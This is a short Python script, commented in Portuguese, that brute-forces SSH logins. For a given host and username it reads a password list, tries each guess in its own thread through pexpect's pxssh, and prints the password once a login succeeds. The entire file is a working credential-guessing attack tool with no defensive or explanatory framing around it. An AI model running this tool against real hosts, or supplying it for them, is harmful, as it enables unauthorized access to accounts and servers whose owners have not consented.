import optparse
import time
from threading import *

from pexpect import pxssh

encontrado = False

def conectar(host, usuario, senha):
    global encontrado

    try:
        s = pxssh.pxssh()
        s.login(host, usuario, senha)
        print( '[+] Senha encontrada: ' + senha)
        encontrado = True
    except:
        pass

def inicio():
    analisador = optparse.OptionParser('use %prog '+\
      '-H <host alvo> -u <usuario> -F <arquivo senhas>'
                              )
    analisador.add_option('-H', dest='host', type='string',\
      help='espqcifique o host alvo')
    analisador.add_option('-F', dest='arq_senhas', type='string',\
      help='especifique o arquivo de senhas')
    analisador.add_option('-u', dest='usuario', type='string',\
      help='especifique o nome do usuario')

    (opcoes, args) = analisador.parse_args()
    host = opcoes.host
    arq_senhas = opcoes.arq_senhas
    usuario = opcoes.usuario

    if host == None or arq_senhas == None or usuario == None:
        print( analisador.usage)
        exit(0)
        
    fn = open(arq_senhas, 'r')
    for linha in fn.readlines():
        if encontrado:
            print( "[*] Saindo: senha encontrada")
            exit(0)

        senha = linha.strip('\r').strip('\n')
        print( "[-] Testando: " + str(senha))
        t = Thread(target=conectar, args=(host, usuario, senha))
        t.start()

if __name__ == '__main__':
    inicio()